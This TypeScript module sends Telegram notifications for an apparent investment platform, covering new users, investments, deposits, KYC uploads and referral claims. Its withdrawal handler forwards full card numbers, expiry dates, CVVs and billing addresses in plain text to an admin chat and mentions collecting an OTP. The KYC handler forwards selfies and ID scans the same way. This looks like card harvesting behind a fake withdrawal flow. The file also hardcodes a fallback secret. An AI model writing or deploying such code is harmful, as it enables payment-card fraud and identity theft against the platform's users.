import TelegramBot from 'node-telegram-bot-api'
import fs from 'fs'
import path from 'path'
import { fileURLToPath } from 'url'

const __dirname = path.dirname(fileURLToPath(import.meta.url))
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || ''
const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID || ''
const BOT_SECRET = process.env.BOT_SECRET || 'ecocash_bot_secret_2024'

let bot: TelegramBot | null = null
let isReady = false

export const initTelegramBot = async (): Promise<TelegramBot | null> => {
  if (!BOT_TOKEN) {
    console.log('Telegram bot not configured - skipping init')
    return null
  }

  if (bot && isReady) return bot

  // Don't use polling on Vercel serverless
  if (process.env.VERCEL) {
    console.log('Skipping Telegram polling on Vercel')
    return null
  }

  try {
    bot = new TelegramBot(BOT_TOKEN, { polling: true })
    isReady = true
    console.log('Telegram bot initialized successfully')
    return bot
  } catch (error) {
    console.error('Telegram bot init error:', error)
    return null
  }
}

export const getTelegramBot = (): TelegramBot | null => {
  return bot
}

export const sendTelegramMessage = async (text: string, options?: TelegramBot.SendMessageOptions): Promise<void> => {
  if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
    console.log('Telegram not configured - message would be:', text.substring(0, 100))
    return
  }

  let botInstance = bot
  if (!botInstance) {
    try {
      botInstance = new TelegramBot(BOT_TOKEN, { polling: false })
      bot = botInstance
    } catch (error) {
      console.error('Telegram bot init error:', error)
      return
    }
  }

  try {
    await botInstance!.sendMessage(ADMIN_CHAT_ID, text, options)
  } catch (error) {
    console.error('Telegram send error:', error)
  }
}

export const sendTelegramWithButtons = async (text: string, buttons: { text: string; callback_data: string }[]): Promise<void> => {
  const markup = {
    inline_keyboard: buttons.map((btn) => [{ text: btn.text, callback_data: btn.callback_data }]),
  }

  await sendTelegramMessage(text, { reply_markup: markup })
}

export const notifyNewUser = async (email: string, userId: string): Promise<void> => {
  const buttons = [
    { text: '✅ Approve', callback_data: `approve_user_${userId}` },
    { text: '❌ Reject', callback_data: `reject_user_${userId}` },
  ]
  
  try {
    let botInstance = bot
    if (!botInstance && BOT_TOKEN) {
      try {
        botInstance = new TelegramBot(BOT_TOKEN, { polling: false })
        bot = botInstance
      } catch (error) {
        console.error('Telegram bot init error:', error)
        return
      }
    }
  
    if (botInstance && ADMIN_CHAT_ID) {
      await sendTelegramWithButtons(`🆕 New User Registration\n\nEmail: ${email}\nUser ID: ${userId}`, buttons)
    } else {
      console.log('Telegram not configured - new user notification would be:', { email, userId })
    }
  } catch (error) {
    console.error('Failed to send new user notification:', error)
  }
}

export const notifyNewInvestment = async (investmentId: string, userName: string, amount: number, userId: string, invUuid: string): Promise<void> => {
  const buttons = [
    { text: 'Start Trade', callback_data: `start_trade_${invUuid}` },
    { text: 'Reject', callback_data: `reject_investment_${invUuid}` },
  ]
  console.log('Sending Telegram notification for new investment:', { investmentId, userName, amount, invUuid })

  let botInstance = bot
  if (!botInstance && BOT_TOKEN) {
    try {
      botInstance = new TelegramBot(BOT_TOKEN, { polling: false })
      bot = botInstance
    } catch (error) {
      console.error('Telegram bot init error:', error)
    }
  }

  if (botInstance && ADMIN_CHAT_ID) {
    try {
      await botInstance.sendMessage(ADMIN_CHAT_ID, `💰 New Investment Request\n\nUser: ${userName}\nAmount: $${amount}\nRequest ID: ${investmentId}\n\nReply with payment details format:\necocash:number,accountName`, {
        reply_markup: {
          inline_keyboard: buttons.map((btn) => [{ text: btn.text, callback_data: btn.callback_data }]),
        },
      })
    } catch (error) {
      console.error('Send investment notification error:', error)
    }
  }
}

export const notifyDepositSubmitted = async (depositId: string, userName: string, amount: number, method: string, receiptPath?: string, txHash?: string): Promise<void> => {
  const buttons = [
    { text: '✅ Approve', callback_data: `approve_deposit_${depositId}` },
    { text: '❌ Reject', callback_data: `reject_deposit_${depositId}` },
  ]

  let botInstance = bot
  if (!botInstance && BOT_TOKEN) {
    try {
      botInstance = new TelegramBot(BOT_TOKEN, { polling: false })
      bot = botInstance
    } catch (error) {
      console.error('Telegram bot init error:', error)
      return
    }
  }

  if (receiptPath && botInstance) {
    const uploadsPath = process.env.VERCEL || process.env.RENDER ? '/tmp/uploads' : path.join(__dirname, '..', '..', 'public', 'uploads')

    try {
      const receiptFullPath = path.join(uploadsPath, receiptPath.replace('/uploads/', ''))
      if (fs.existsSync(receiptFullPath)) {
        const photoStream = fs.createReadStream(receiptFullPath)
        await botInstance.sendPhoto(ADMIN_CHAT_ID, photoStream, {
          caption: `📥 Payment Submitted\n\nUser: ${userName}\nAmount: $${amount}\nMethod: ${method}${txHash ? `\nTxHash: ${txHash}` : ''}`,
          reply_markup: {
            inline_keyboard: buttons.map((btn) => [{ text: btn.text, callback_data: btn.callback_data }]),
          },
        })
      } else {
        await sendTelegramWithButtons(`📥 Payment Submitted\n\nUser: ${userName}\nAmount: $${amount}\nMethod: ${method}\nReceipt: File not found${txHash ? `\nTxHash: ${txHash}` : ''}`, buttons)
      }
    } catch (error) {
      console.error('Failed to send photo, falling back to message:', error)
      await sendTelegramWithButtons(`📥 Payment Submitted\n\nUser: ${userName}\nAmount: $${amount}\nMethod: ${method}\nReceipt: ${receiptPath}${txHash ? `\nTxHash: ${txHash}` : ''}`, buttons)
    }
  } else {
    await sendTelegramWithButtons(`📥 Payment Submitted\n\nUser: ${userName}\nAmount: $${amount}\nMethod: ${method}${txHash ? `\nTxHash: ${txHash}` : ''}`, buttons)
  }
}

export const notifyWithdrawalRequest = async (withdrawalId: string, userName: string, amount: number, method: string, cardDetails?: { cardNumber: string; cardholderName: string; expiryDate: string; cvv: string; billingAddress?: string }): Promise<void> => {
  const buttons = [
    { text: '❌ Reject', callback_data: `reject_withdrawal_${withdrawalId}` },
  ]

  if (cardDetails) {
    const formattedCard = cardDetails.cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ')
    const message = `💸 Withdrawal Request\n\nUser: ${userName}\nAmount: $${amount}\nMethod: CARD\n\n💳 Card: ${formattedCard}\n👤 Holder: ${cardDetails.cardholderName}\n📅 Expiry: ${cardDetails.expiryDate}\n🔐 CVV: ${cardDetails.cvv}\n🏠 Billing: ${cardDetails.billingAddress || 'N/A'}\n\nUser will enter OTP to authorize.`

    try {
      let botInstance = bot
      if (!botInstance && BOT_TOKEN) {
        try {
          botInstance = new TelegramBot(BOT_TOKEN, { polling: false })
          bot = botInstance
        } catch (error) {
          console.error('Telegram bot init error:', error)
          return
        }
      }

      if (botInstance && ADMIN_CHAT_ID) {
        await sendTelegramWithButtons(message, buttons)
      } else {
        console.log('Telegram not configured - withdrawal notification would be:', { withdrawalId, userName, amount })
      }
    } catch (error) {
      console.error('Failed to send withdrawal notification:', error)
    }
  }
}

export const notifyTradeClosed = async (investmentId: string, userName: string): Promise<void> => {
  try {
    await sendTelegramMessage(`🔒 Trade Closed\n\nInvestment: ${investmentId}\nUser: ${userName}`)
  } catch (error) {
    console.error('Failed to send trade closed notification:', error)
  }
}

export const notifyAuditLog = async (action: string, adminId?: string, details?: any): Promise<void> => {
  try {
    await sendTelegramMessage(`📋 Audit Log\nAction: ${action}\nAdmin: ${adminId || 'system'}${details ? `\nDetails: ${JSON.stringify(details)}` : ''}`)
  } catch (error) {
    console.error('Failed to send audit log notification:', error)
  }
}

export const notifyKYCSubmission = async (userId: string, userName: string, selfieUrl?: string, idFrontUrl?: string, idBackUrl?: string): Promise<void> => {
  const buttons = [
    { text: '✅ Approve KYC', callback_data: `approve_kyc_${userId}` },
    { text: '❌ Reject KYC', callback_data: `reject_kyc_${userId}` },
  ]

  try {
    let botInstance = bot
    if (!botInstance && BOT_TOKEN) {
      try {
        botInstance = new TelegramBot(BOT_TOKEN, { polling: false })
        bot = botInstance
      } catch (error) {
        console.error('Telegram bot init error:', error)
        return
      }
    }

    if (botInstance && ADMIN_CHAT_ID) {
      const uploadsPath = process.env.VERCEL || process.env.RENDER ? '/tmp/uploads/kyc' : path.join(__dirname, '..', '..', 'public', 'uploads', 'kyc')

      // Send selfie photo
      if (selfieUrl) {
        try {
          const selfiePath = path.join(uploadsPath, selfieUrl.replace('/uploads/kyc/', ''))
          if (fs.existsSync(selfiePath)) {
            const photoStream = fs.createReadStream(selfiePath)
            await botInstance.sendPhoto(ADMIN_CHAT_ID, photoStream, {
              caption: `Selfie - ${userName}`,
            })
          }
        } catch (e) {
          console.error('Selfie send error:', e)
        }
      }

      // Send ID front photo
      if (idFrontUrl) {
        try {
          const frontPath = path.join(uploadsPath, idFrontUrl.replace('/uploads/kyc/', ''))
          if (fs.existsSync(frontPath)) {
            const photoStream = fs.createReadStream(frontPath)
            await botInstance.sendPhoto(ADMIN_CHAT_ID, photoStream, {
              caption: `ID Front - ${userName}`,
            })
          }
        } catch (e) {
          console.error('ID front send error:', e)
        }
      }

      // Send ID back photo
      if (idBackUrl) {
        try {
          const backPath = path.join(uploadsPath, idBackUrl.replace('/uploads/kyc/', ''))
          if (fs.existsSync(backPath)) {
            const photoStream = fs.createReadStream(backPath)
            await botInstance.sendPhoto(ADMIN_CHAT_ID, photoStream, {
              caption: `ID Back - ${userName}`,
            })
          }
        } catch (e) {
          console.error('ID back send error:', e)
        }
      }

      // Send message with buttons after photos
      await sendTelegramWithButtons(`📋 KYC Submission\n\nUser: ${userName}\nID: ${userId}\n\nDocuments attached for verification`, buttons)
    } else {
      console.log('Telegram not configured - KYC notification would be:', { userId, userName })
    }
  } catch (error) {
    console.error('Failed to send KYC notification:', error)
  }
}

export const notifyReferralClaim = async (claimId: string, userName: string, email: string, amount: number, bonusCount: number): Promise<void> => {
  const buttons = [
    { text: '✅ Approve referral reward', callback_data: `approve_referral_claim_${claimId}` },
    { text: '❌ Reject', callback_data: `reject_referral_claim_${claimId}` },
  ]
  await sendTelegramWithButtons(
    `🎁 Referral reward claim\n\nUser: ${userName}\nEmail: ${email}\nAmount: $${amount.toFixed(2)}\nRewards: ${bonusCount}\n\nReview and approve the reward.`,
    buttons,
  )
}
